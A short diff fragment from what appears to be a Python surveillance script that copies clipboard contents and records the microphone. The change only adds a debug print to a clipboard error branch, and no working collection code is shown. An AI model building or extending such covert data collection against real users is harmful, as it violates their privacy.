@@ -145,6 +145,7 @@ def copy_clipboard():
             print("clipboard ok")
         except:
             f.write("Clipboard Could not be copied. \n")
+            print("clipboard nok")
 
 # Get Microphone Recordings
 def microphone():
